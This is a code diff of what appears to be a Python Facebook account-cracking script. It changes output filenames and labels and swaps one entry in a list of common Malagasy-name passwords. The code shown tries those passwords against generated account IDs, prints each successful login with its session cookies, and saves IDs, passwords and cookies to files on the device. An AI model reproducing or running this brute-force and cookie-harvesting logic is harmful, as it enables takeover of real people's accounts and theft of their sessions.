@@ -443,7 +443,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'fitiavana','nirina','mamiko','malalako','malala','mamako','vadiko','niaina','hasina','anjara','solofo','safidy','nantenaina','sarobidy','faniry','nomena','tolotra','tanjona','anjara','rakoto','sitraka','zanako','felana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','mahery','Mahery','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara']
+                                passlist = [psx,ids,'fitiavana','nirina','mamiko','malalako','malala','mamako','vadiko','niaina','randria','anjara','solofo','safidy','nantenaina','sarobidy','faniry','nomena','tolotra','tanjona','anjara','rakoto','sitraka','zanako','felana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','mahery','Mahery','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara']
                                 ennic.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
@@ -852,10 +852,10 @@ def rndm(ids,passlist):
                                 if str(uid) in oks:
                                         break
                                 else:
-                                        print('\r\r\033[1;32m [Nobe-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [MARC-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print("\r\r\033[1;37m Cookie: "+coki)
-                                        open('/sdcard/IDSOKS.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                        open('/sdcard/MARC.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                     #    open('/sdcard/Steve-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
@@ -867,7 +867,7 @@ def rndm(ids,passlist):
                                 if uid in oks:pass
                                 else:
                                       #  print('\r\r\x1b[1;31m [STEVE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/IDSNO.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/MARC23.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                         open('/sdcard/CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
